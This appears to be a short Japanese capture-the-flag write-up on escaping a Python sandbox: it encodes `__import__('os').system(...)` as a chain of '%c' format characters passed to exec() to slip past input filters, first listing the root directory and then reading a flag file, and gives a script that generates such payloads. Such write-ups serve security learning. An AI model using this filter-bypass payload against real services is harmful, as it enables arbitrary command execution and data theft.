`__import__("os").system("ls /")`を`%c`フォーマットを使って数字に変更する。

```
exec('%c'%95+'%c'%95+'%c'%105+'%c'%109+'%c'%112+'%c'%111+'%c'%114+'%c'%116+'%c'%95+'%c'%95+'%c'%40+'%c'%34+'%c'%111+'%c'%115+'%c'%34+'%c'%41+'%c'%46+'%c'%115+'%c'%121+'%c'%115+'%c'%116+'%c'%101+'%c'%109+'%c'%40+'%c'%34+'%c'%108+'%c'%115+'%c'%32+'%c'%47+'%c'%34+'%c'%41)
```

↑これでflag.txtのパスを確認して、`__import__("os").system("cat /[パス]")`を変換してから入力する。

変換スクリプトは以下。

```python
# ファイル名は都度変わる
statement = '__import__("os").system("cat /flag-eb96d1d365a62d646619bf6f9d7e3f24.txt")'

payload = ""
for c in statement:
    payload += f"'%c'%{ord(c)}+"

print(f"exec({payload[:-1]})")
```

## 参考文献

https://qiita.com/sheon/items/da3fdc9e5750515c1f0c